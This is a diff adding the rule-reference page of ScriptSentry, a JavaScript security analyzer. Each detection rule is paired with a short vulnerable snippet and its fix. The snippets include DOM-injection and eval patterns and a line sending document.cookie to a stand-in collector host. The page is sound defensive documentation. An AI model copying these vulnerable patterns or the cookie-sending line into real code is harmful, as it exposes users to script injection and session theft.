@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Rule reference — ScriptSentry</title>
+  <meta name="description" content="What every ScriptSentry finding means in plain language, how severe it is, and what the fix usually looks like -- generated from the engine's own rule registry." />
+  <meta name="color-scheme" content="dark" />
+  <meta name="theme-color" content="#060a13" />
+  <meta name="author" content="Amit Pal" />
+  <meta name="referrer" content="no-referrer" />
+  <meta name="robots" content="index, follow" />
+
+  <!-- Identity: favicons, app icon and social card -->
+  <link rel="icon" type="image/svg+xml" href="../assets/favicon.svg" />
+  <link rel="icon" type="image/png" sizes="32x32" href="../assets/favicon-32.png" />
+  <link rel="icon" type="image/png" sizes="192x192" href="../assets/icon-192.png" />
+  <link rel="apple-touch-icon" href="../assets/apple-touch-icon.png" />
+  <link rel="manifest" href="../assets/site.webmanifest" />
+
+  <!-- Open Graph / Twitter -->
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="ScriptSentry" />
+  <meta property="og:title" content="ScriptSentry — Rule reference" />
+  <meta property="og:description" content="What every ScriptSentry finding means in plain language, how severe it is, and what the fix usually looks like -- generated from the engine's own rule registry." />
+  <meta property="og:image" content="../assets/og-card.png" />
+  <meta property="og:image:alt" content="ScriptSentry — privacy-first JavaScript security analyzer" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="ScriptSentry — Watch every line. Detect every risk." />
+  <meta name="twitter:description" content="Free, privacy-first JavaScript security &amp; script-behavior intelligence. Runs locally — your code never leaves your machine." />
+  <meta name="twitter:image" content="../assets/og-card.png" />
+
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; connect-src 'self' blob: data: http://127.0.0.1:* http://localhost:* https:; img-src 'self' data: blob:; style-src 'self' 'unsafe-inline'; script-src 'self'; font-src 'self'; manifest-src 'self'; frame-ancestors 'none'; base-uri 'none';" />
+  <link rel="stylesheet" href="../styles.css" />
+  <script src="../config.js"></script>
+</head>      <!-- Generated from the engine's PLAIN_TERMS registry by tools/build_rules_page.py -- do not hand-edit. -->
+<body>
+<header class="site-header" id="site-header">
+    <div class="header-inner">
+      <a class="brand" href="../home/" aria-label="ScriptSentry home">
+        <span class="mark" aria-hidden="true">
+          <svg viewBox="0 0 32 32" role="img" aria-hidden="true" focusable="false">
+            <defs>
+              <linearGradient id="ssMark" x1="0" y1="0" x2="1" y2="1">
+                <stop offset="0" stop-color="#22d3ee" />
+                <stop offset="1" stop-color="#a78bfa" />
+              </linearGradient>
+            </defs>
+            <path d="M16 2.2 27.5 6v9.6c0 6.6-4.9 12.2-11.5 14.2C9.4 27.8 4.5 22.2 4.5 15.6V6z" fill="url(#ssMark)" opacity=".16" />
+            <path d="M16 2.2 27.5 6v9.6c0 6.6-4.9 12.2-11.5 14.2C9.4 27.8 4.5 22.2 4.5 15.6V6z" fill="none" stroke="url(#ssMark)" stroke-width="2.2" stroke-linejoin="round" />
+            <g fill="none" stroke="#eaf6ff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M13.2 12.4 9.8 16l3.4 3.6" />
+              <path d="M18.8 12.4 22.2 16l-3.4 3.6" />
+              <path d="M17.3 11.2 14.7 20.8" />
+            </g>
+          </svg>
+        </span>
+        <span class="brand-text">
+          <span class="brand-name">ScriptSentry</span>
+          <span class="sub">JS Intelligence Studio</span>
+        </span>
+      </a>
+
+      <div class="nav-current" id="nav-current" aria-hidden="true"></div>
+      <nav class="site-nav" id="site-nav" aria-label="Main">
+        <a href="../home/#features">What It Finds</a>
+        <a href="../home/#how">How It Works</a>
+        <a href="../home/#trust">Trust</a>
+        
+        <a href="../home/#setup">Setup</a>
+        <a href="../rules/" aria-current="page">Rules</a>
+        <a href="../home/#connect">Connect</a>
+      </nav>
+
+      <div class="header-actions">
+        <a class="btn btn-sm go-to-tool" href="../tool/">⚡ Go to tool</a>
+      </div>
+      <button class="nav-toggle" id="nav-toggle" type="button" aria-expanded="false"
+              aria-controls="site-nav" aria-label="Open Navigation Menu">
+        <span class="nav-toggle-bars" aria-hidden="true"></span>
+      </button>
+    </div>
+    <div class="scroll-progress" id="scroll-progress" aria-hidden="true"></div>
+  </header>
+  <main class="wrap" id="main">
+    <header class="changelog-intro">
+      <span class="section-kicker">Detection rules</span>
+      <h1>Rule reference</h1>
+      <p class="changelog-sub">What every finding means in plain language, and what the fix usually looks like — generated from the engine, so the docs and the reports always agree.</p>
+    </header>
+
+    <div class="changelog">
+      <section class="release" id="vulnerabilitys">
+        <h2>Actionable findings</h2>
+        <article class="rule" id="rule-dom_injection">
+          <h3><code>dom_injection</code> — DOM injection <span class="sev-chip sev-high">HIGH</span></h3>
+          <p class="rule-meaning"><strong>What it means.</strong> The code inserts information taken from the page address or user input directly into the page without cleaning it first. An attacker can craft a link that makes the page run their own script in a visitor's browser (a common attack called cross-site scripting).</p>
+          <p class="rule-meaning"><strong>What to do.</strong> Clean the value before it is inserted into the page, or use a safer rendering method. The security team should verify the listed lines.</p>
+          <div class="code-box">
+            <pre>const q = new URLSearchParams(location.search).get('q');
+el.innerHTML = q;</pre>
+          </div>
+          <div class="code-box">
+            <pre>el.textContent = q;  // or sanitize with DOMPurify before innerHTML</pre>
+          </div>
+        </article>
+        <article class="rule" id="rule-dom_injection_document_write">
+          <h3><code>dom_injection_document_write</code> — DOM injection (document.write) <span class="sev-chip sev-high">HIGH</span></h3>
+          <p class="rule-meaning"><strong>What it means.</strong> The code writes information taken from the page address or user input straight into the document. A crafted link can make a visitor's browser run attacker-controlled script (cross-site scripting).</p>
+          <p class="rule-meaning"><strong>What to do.</strong> Avoid writing raw input into the document; render cleaned values only.</p>
+          <div class="code-box">
+            <pre>document.write('&lt;b&gt;' + location.hash.slice(1) + '&lt;/b&gt;');</pre>
+          </div>
+          <div class="code-box">
+            <pre>const el = document.createElement('b');
+el.textContent = location.hash.slice(1);
+document.body.appendChild(el);</pre>
+          </div>
+        </article>
+        <article class="rule" id="rule-hardcoded_secret">
+          <h3><code>hardcoded_secret</code> — Hardcoded secret candidate <span class="sev-chip sev-high">HIGH</span></h3>
+          <p class="rule-meaning"><strong>What it means.</strong> A credential (password, API key or token) appears in plain text inside the shipped code. Anyone who can view or download the code - including this scan - can read it.</p>
+          <p class="rule-meaning"><strong>What to do.</strong> Move the credential to a secure configuration store and replace the exposed one; assume it is compromised once it has shipped.</p>
+          <div class="code-box">
+            <pre>const apiKey = "kx9vQm2LpTn8Rb4Wc6Yd3Zf7Hj5";
+fetch('https://api.example.com/v2?key=' + apiKey);</pre>
+          </div>
+          <div class="code-box">
+            <pre>// Read the key from server-side configuration instead:
+// fetch('/api/keys/current')  -- the secret never ships in the bundle</pre>
+          </div>
+        </article>
+        <article class="rule" id="rule-data_exfiltration_flow">
+          <h3><code>data_exfiltration_flow</code> — Sensitive data sent to a network sink <span class="sev-chip sev-high">HIGH</span></h3>
+          <p class="rule-meaning"><strong>What it means.</strong> The code reads private information (login details, cookies, form input) and sends it to an external destination. If that destination is not yours or not expected, this is how data leaks happen.</p>
+          <p class="rule-meaning"><strong>What to do.</strong> Confirm the destination is legitimate and intended; remove or gate the transfer if it is not.</p>
+          <div class="code-box">
+            <pre>fetch('https://collector.example/log?c=' + document.cookie);</pre>
+          </div>
+          <div class="code-box">
+            <pre>// Remove the call, or gate it to your own origin with the
+// minimum data it actually needs.</pre>
+          </div>
+        </article>
+        <article class="rule" id="rule-open_redirect">
+          <h3><code>open_redirect</code> — Client-side open redirect <span class="sev-chip sev-high">HIGH</span></h3>
+          <p class="rule-meaning"><strong>What it means.</strong> The code sends visitors to whatever address is in the link, without checking it. Attackers use this to wrap phishing pages in your site's trusted name.</p>
+          <p class="rule-meaning"><strong>What to do.</strong> Only allow redirects to a list of approved addresses.</p>
+          <div class="code-box">
+            <pre>const next = new URLSearchParams(location.search).get('next');
+location = next;</pre>
+          </div>
+          <div class="code-box">
+            <pre>const ALLOWED = new Set(['/dashboard', '/profile']);
+if (ALLOWED.has(next)) location = next;  // allowlist, never a raw value</pre>
+          </div>
+        </article>
+        <article class="rule" id="rule-dangerous_dynamic_code">
+          <h3><code>dangerous_dynamic_code</code> — Dangerous dynamic code execution <span class="sev-chip sev-high">HIGH</span></h3>
+          <p class="rule-meaning"><strong>What it means.</strong> The code constructs program instructions from text at run time. If any part of that text comes from outside, an attacker may be able to run their own instructions.</p>
+          <p class="rule-meaning"><strong>What to do.</strong> Remove the dynamic execution, or make sure its input can never be influenced from outside.</p>
+          <div class="code-box">
+            <pre>eval(userInput);
+setTimeout('go(' + input + ')', 100);
+window[String.fromCharCode(101,118,97,108)](payload);</pre>
+          </div>
+          <div class="code-box">
+            <pre>JSON.parse(input);            // for data
+setTimeout(() =&gt; go(input), 100);  // for behaviour: pass a function</pre>
+          </div>
+        </article>
+        <article class="rule" id="rule-vulnerable_dependency">
+          <h3><code>vulnerable_dependency</code> — Vulnerable dependency (npm advisory) <span class="sev-chip sev-high">HIGH</span></h3>
+          <p class="rule-meaning"><strong>What it means.</strong> </p>
+          <p class="rule-meaning"><strong>What to do.</strong> </p>
+          <div class="code-box">
+            <pre>// package.json
+"dependencies": { "left-pad": "1.0.0" }  // matches a known advisory</pre>
+          </div>
+          <div class="code-box">
+            <pre>npm audit fix  // or pin a patched version and verify the upgrade</pre>
+          </div>
+        </article>
+        <article class="rule" id="rule-exposed_key_iv_pair">
+          <h3><code>exposed_key_iv_pair</code> — Exposed key + IV pair <span class="sev-chip sev-medium">MEDIUM</span></h3>
+          <p class="rule-meaning"><strong>What it means.</strong> Both the encryption key and its starting value are in the shipped code. Encryption with a visible key protects nothing.</p>
+          <p class="rule-meaning"><strong>What to do.</strong> Move the key somewhere safe; treat data encrypted with it as exposed.</p>
+          <div class="code-box">
+            <pre>const key = '0123456789abcdef';
+const iv  = 'abcdef9876543210';</pre>
+          </div>
+          <div class="code-box">
+            <pre>// Hardcoding the IV alongside the key defeats its purpose.
+// Generate a random IV per message and send it alongside the ciphertext.</pre>
+          </div>
+        </article>
+        <article class="rule" id="rule-static_crypto_key">
+          <h3><code>static_crypto_key</code> — Static cryptographic key <span class="sev-chip sev-medium">MEDIUM</span></h3>
+          <p class="rule-meaning"><strong>What it means.</strong> A fixed encryption key is embedded in the code where anyone reading it can copy it.</p>
+          <p class="rule-meaning"><strong>What to do.</strong> Move the key to a secure store and rotate it.</p>
+          <div class="code-box">
+            <pre>const key = CryptoJS.enc.Utf8.parse('my-secret-key-123');</pre>
+          </div>
+          <div class="code-box">
+            <pre>// Move encryption to the server, or derive keys per session
+// via the WebCrypto API -- never embed the key in shipped code.</pre>
+          </div>
+        </article>
+        <article class="rule" id="rule-insecure_postmessage">
+          <h3><code>insecure_postmessage</code> — Insecure postMessage (wildcard origin) <span class="sev-chip sev-medium">MEDIUM</span></h3>
+          <p class="rule-meaning"><strong>What it means.</strong> The code sends a message to another window and explicitly allows ANY origin to receive it. If the receiving page is ever embedded by an attacker-controlled page, that page receives the message too.</p>
+          <p class="rule-meaning"><strong>What to do.</strong> Name the exact origin instead of the wildcard, and validate the payload on the receiving side.</p>
+          <div class="code-box">
+            <pre>window.parent.postMessage(session, '*');</pre>
+          </div>
+          <div class="code-box">
+            <pre>window.parent.postMessage(session, 'https://app.example.com');</pre>
+          </div>
+        </article>
+        <article class="rule" id="rule-prototype_pollution">
+          <h3><code>prototype_pollution</code> — Prototype pollution pattern <span class="sev-chip sev-medium">MEDIUM</span></h3>
+          <p class="rule-meaning"><strong>What it means.</strong> The code merges or writes objects in a way that can modify JavaScript's shared prototypes when the input comes from the page address or user data. Successful pollution can change application logic everywhere.</p>
+          <p class="rule-meaning"><strong>What to do.</strong> Validate untrusted objects against a schema and reject keys like __proto__ and constructor before merging.</p>
+          <div class="code-box">
+            <pre>Object.assign(cfg, JSON.parse('{' + location.hash.slice(1) + '}'));</pre>
+          </div>
+          <div class="code-box">
+            <pre>// Validate untrusted objects against a schema and reject
+// __proto__/constructor keys before merging.</pre>
+          </div>
+        </article>
+        <article class="rule" id="rule-jquery_dom_manipulation">
+          <h3><code>jquery_dom_manipulation</code> — jQuery DOM manipulation with untrusted data <span class="sev-chip sev-medium">MEDIUM</span></h3>
+          <p class="rule-meaning"><strong>What it means.</strong> jQuery DOM methods that interpret HTML are fed data that may come from the page address or user input -- the jQuery sibling of DOM injection.</p>
+          <p class="rule-meaning"><strong>What to do.</strong> Use .text() for plain values, or sanitize with DOMPurify before calling .html()/.append() with markup.</p>
+          <div class="code-box">
+            <pre>$('#output').html(decodeURI(location.hash));</pre>
+          </div>
+          <div class="code-box">
+            <pre>$('#output').text(decodeURI(location.hash));</pre>
+          </div>
+        </article>
+      </section>
+      <section class="release" id="observations">
+        <h2>Observations</h2>
+        <article class="rule" id="rule-data_exfiltration_candidate">
+          <h3><code>data_exfiltration_candidate</code> — URL-derived data sent to an external destination <span class="sev-chip sev-low">LOW</span></h3>
+          <p class="rule-meaning"><strong>What it means.</strong> The code both reads private information and contacts external services. This is only a pattern match - it may be perfectly normal - but the combination is worth checking.</p>
+          <p class="rule-meaning"><strong>What to do.</strong> Have the security team confirm where the data actually goes.</p>
+          <div class="code-box">
+            <pre>fetch('https://cdn.example.com/track?from=' + location.href);</pre>
+          </div>
+          <div class="code-box">
+            <pre>// Review: URL data to a third party is often analytics, not a leak.</pre>
+          </div>
+        </article>
+        <article class="rule" id="rule-sensitive_storage">
+          <h3><code>sensitive_storage</code> — Sensitive value in browser storage <span class="sev-chip sev-medium">MEDIUM</span></h3>
+          <p class="rule-meaning"><strong>What it means.</strong> The code stores sensitive-looking information in the browser's storage. Anything stored there can be read by other scripts on the page.</p>
+          <p class="rule-meaning"><strong>What to do.</strong> Store only what is necessary, and prefer server-side sessions.</p>
+          <div class="code-box">
+            <pre>localStorage.setItem('authToken', token);</pre>
+          </div>
+          <div class="code-box">
+            <pre>// XSS makes localStorage readable; prefer httpOnly cookies
+// for anything that authenticates a user.</pre>
+          </div>
+        </article>
+        <article class="rule" id="rule-unsafe_runtime">
+          <h3><code>unsafe_runtime</code> — Risky runtime pattern <span class="sev-chip sev-low">LOW</span></h3>
+          <p class="rule-meaning"><strong>What it means.</strong> The code uses mechanisms that build or run instructions dynamically - legitimate in some cases, dangerous if the input is ever influenced by an outsider.</p>
+          <p class="rule-meaning"><strong>What to do.</strong> Security team: check whether outside input can reach these calls.</p>
+          <div class="code-box">
+            <pre>new Function(decodeURIComponent(payload))();</pre>
+          </div>
+          <div class="code-box">
+            <pre>// Static pattern only: confirm what executes and prefer explicit code.</pre>
+          </div>
+        </article>
+        <article class="rule" id="rule-api_surface">
+          <h3><code>api_surface</code> — API surface mapped <span class="sev-chip sev-info">INFO</span></h3>
+          <p class="rule-meaning"><strong>What it means.</strong> An inventory observation: the code calls endpoints that look like an API. Not a vulnerability by itself -- the map exists so endpoints can be reviewed for server-side authorization and rate limiting.</p>
+          <p class="rule-meaning"><strong>What to do.</strong> Use the API map to review each endpoint: does it need auth? Does it rate-limit? Is it still supposed to exist?</p>
+          <div class="code-box">
+            <pre>fetch('https://api.example.com/v2/users?page=2');</pre>
+          </div>
+          <div class="code-box">
+            <pre>// Inventory only: use the API map to spot endpoints that
+// should require server-side authorization.</pre>
+          </div>
+        </article>
+        <article class="rule" id="rule-obfuscation">
+          <h3><code>obfuscation</code> — Obfuscation indicators <span class="sev-chip sev-low">LOW</span></h3>
+          <p class="rule-meaning"><strong>What it means.</strong> The code uses encoding and string-building patterns typical of obfuscated bundles. Obfuscation is not malicious by itself, but it hides behaviour from review.</p>
+          <p class="rule-meaning"><strong>What to do.</strong> Beautify and deobfuscate the bundle, then re-scan the readable code before trusting it.</p>
+          <div class="code-box">
+            <pre>var _0x1a2b = ['\x61\x6c\x65\x72\x74'];</pre>
+          </div>
+          <div class="code-box">
+            <pre>// Flagged for review: obfuscation hides behaviour.
+// Beautify and deobfuscate before trusting the code.</pre>
+          </div>
+        </article>
+        <article class="rule" id="rule-client_side_crypto">
+          <h3><code>client_side_crypto</code> — Client-side cryptography in use <span class="sev-chip sev-info">INFO</span></h3>
+          <p class="rule-meaning"><strong>What it means.</strong> An inventory observation: cryptographic work happens in the browser. Fine for checksums and local scrambling; never a substitute for server-side secrecy.</p>
+          <p class="rule-meaning"><strong>What to do.</strong> Anything encrypted in the client is visible to a determined user -- keep real secrets on the server.</p>
+          <div class="code-box">
+            <pre>const hash = CryptoJS.SHA256(input).toString();</pre>
+          </div>
+          <div class="code-box">
+            <pre>// Fine for checksums; never a substitute for server-side
+// secrecy -- anything in the client is visible to the user.</pre>
+          </div>
+        </article>
+      </section>
+      <section class="release" id="legacy-ids">
+        <h2>Legacy ids</h2>
+        <p>Older reports used ids that map to the rules above: <code>dom_xss</code> (older reports used this id for DOM injection findings) <code>secret</code> (value-shape secret hits reported before the id was split).</p>
+      </section>
+    </div>
+
+    <p class="changelog-back"><a href="../home/#features">&larr; Back to What It Finds</a></p>
+    <p class="changelog-back"><a href="../tool/">Open the analyzer &rarr;</a></p>
+  </main>
+<footer class="site-footer">
+    <div class="footer-inner">
+      <div class="footer-brand">
+        <a class="brand footer-brand-row" href="../home/" aria-label="ScriptSentry home">
+          <span class="mark" aria-hidden="true">
+            <svg viewBox="0 0 32 32" role="img" aria-hidden="true" focusable="false">
+              <defs>
+                <linearGradient id="ssMark2" x1="0" y1="0" x2="1" y2="1">
+                  <stop offset="0" stop-color="#22d3ee" />
+                  <stop offset="1" stop-color="#a78bfa" />
+                </linearGradient>
+              </defs>
+              <path d="M16 2.2 27.5 6v9.6c0 6.6-4.9 12.2-11.5 14.2C9.4 27.8 4.5 22.2 4.5 15.6V6z" fill="url(#ssMark2)" opacity=".16" />
+              <path d="M16 2.2 27.5 6v9.6c0 6.6-4.9 12.2-11.5 14.2C9.4 27.8 4.5 22.2 4.5 15.6V6z" fill="none" stroke="url(#ssMark2)" stroke-width="2.2" stroke-linejoin="round" />
+              <g fill="none" stroke="#eaf6ff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M13.2 12.4 9.8 16l3.4 3.6" />
+                <path d="M18.8 12.4 22.2 16l-3.4 3.6" />
+                <path d="M17.3 11.2 14.7 20.8" />
+              </g>
+            </svg>
+          </span>
+          <span class="brand-text">
+            <span class="brand-name">ScriptSentry</span>
+            <span class="sub">JS Intelligence Studio</span>
+          </span>
+        </a>
+        <p>
+          Local-first JavaScript security analysis — free, open source, and it runs on your
+          own machine.
+        </p>
+      </div>
+
+      <nav class="footer-col" aria-label="Product">
+        <h3>Product</h3>
+        <a href="../tool/">⚡ Open the Analyzer</a>
+        <a href="../changelog/">📜 What's New</a>
+      </nav>
+
+      <nav class="footer-col" aria-label="Connect">
+        <h3>Connect</h3>
+        <a href="https://github.com/AmitPal-CyberBuddy/ScriptSentry/issues/new/choose" target="_blank" rel="noopener noreferrer">🐞 Report a bug or a wrong finding</a>
+        <a href="https://www.linkedin.com/in/amitpal-wb/" target="_blank" rel="noopener noreferrer">💼 LinkedIn</a>
+      </nav>
+    </div>
+
+    <div class="footer-legal">
+      <p>
+        ⚖️ <b>Authorized testing only.</b> Scan only what you own or have written permission
+        to test. ScriptSentry gives you triage signals, not proof — verify every finding before
+        you act on it. You are responsible for complying with all applicable laws and the
+        target's terms of service.
+      </p>
+      <p class="footer-meta">
+        ScriptSentry · JS Intelligence Studio · <strong>private &amp; free</strong> ·
+        <a class="js-open-setup" href="../home/#setup">view the setup guide</a> · no telemetry, no accounts, no cloud.
+      </p>
+    </div>
+  </footer>
+  <script src="../app.js"></script>
+</body>
+</html>
